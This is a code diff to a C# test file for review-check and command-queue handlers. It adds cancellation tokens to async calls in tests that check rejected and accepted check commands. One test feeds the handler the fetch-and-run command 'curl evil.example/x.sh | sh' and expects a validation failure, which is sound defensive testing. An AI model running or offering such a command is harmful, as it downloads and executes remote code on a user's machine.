@@ -70,7 +70,7 @@ public sealed partial class PipelineHandlerTests
         var result = await new RecordReviewCheckHandler(factory, new EnqueueCommandHandler(factory))
             .HandleAsync(new RecordReviewCheckCommand(
                 new RecordReviewCheckRequest(task.Id, Guid.NewGuid(), Guid.NewGuid(), "curl evil.example/x.sh | sh"),
-                TokenActor()));
+                TokenActor()), TestContext.Current.CancellationToken);
 
         Assert.False(result.Success);
         Assert.Equal(ErrorKind.Validation, result.Kind);
@@ -85,7 +85,7 @@ public sealed partial class PipelineHandlerTests
         var result = await new RecordReviewCheckHandler(factory, new EnqueueCommandHandler(factory))
             .HandleAsync(new RecordReviewCheckCommand(
                 new RecordReviewCheckRequest(task.Id, Guid.NewGuid(), Guid.NewGuid(), null),
-                HumanActor(Guid.NewGuid())));
+                HumanActor(Guid.NewGuid())), TestContext.Current.CancellationToken);
 
         Assert.False(result.Success);
         Assert.Equal(ErrorKind.Validation, result.Kind);
@@ -101,7 +101,7 @@ public sealed partial class PipelineHandlerTests
         var result = await new RecordReviewCheckHandler(factory, new EnqueueCommandHandler(factory))
             .HandleAsync(new RecordReviewCheckCommand(
                 new RecordReviewCheckRequest(task.Id, Guid.NewGuid(), Guid.NewGuid(), null),
-                TokenActor()));
+                TokenActor()), TestContext.Current.CancellationToken);
 
         Assert.False(result.Success);
         Assert.Equal(ErrorKind.Conflict, result.Kind);
@@ -122,7 +122,7 @@ public sealed partial class PipelineHandlerTests
             var result = await new RecordReviewCheckHandler(factory, new EnqueueCommandHandler(factory))
                 .HandleAsync(new RecordReviewCheckCommand(
                     new RecordReviewCheckRequest(task.Id, device.Id, user.Id, null),
-                    TokenActor()));
+                    TokenActor()), TestContext.Current.CancellationToken);
 
             Assert.True(result.Success, result.Error);
 
@@ -130,7 +130,7 @@ public sealed partial class PipelineHandlerTests
             var command = await _db.WorkstationCommands
                 .Where(c => c.DeviceId == device.Id && c.Kind == WorkstationCommandKind.RunReviewCheck)
                 .OrderByDescending(c => c.CreatedAt)
-                .FirstAsync();
+                .FirstAsync(TestContext.Current.CancellationToken);
             using var doc = JsonDocument.Parse(command.PayloadJson);
             Assert.Equal("dotnet test", doc.RootElement.GetProperty("checkCommand").GetString());
         }
@@ -151,7 +151,7 @@ public sealed partial class PipelineHandlerTests
 
         var result = await new EnqueueCommandHandler(factory)
             .HandleAsync(new EnqueueCommandCommand(new EnqueueCommandRequest(
-                device.Id, user.Id, WorkstationCommandKind.RunReviewCheck, payload, projectId)));
+                device.Id, user.Id, WorkstationCommandKind.RunReviewCheck, payload, projectId)), TestContext.Current.CancellationToken);
 
         Assert.False(result.Success);
         Assert.Equal(ErrorKind.Conflict, result.Kind);
@@ -172,7 +172,7 @@ public sealed partial class PipelineHandlerTests
 
         var result = await new EnqueueCommandHandler(factory)
             .HandleAsync(new EnqueueCommandCommand(new EnqueueCommandRequest(
-                device.Id, user.Id, WorkstationCommandKind.RunReviewCheck, payload, projectId, "dotnet test")));
+                device.Id, user.Id, WorkstationCommandKind.RunReviewCheck, payload, projectId, "dotnet test")), TestContext.Current.CancellationToken);
 
         Assert.True(result.Success, result.Error);
         using var doc = JsonDocument.Parse(result.Value!.PayloadJson);
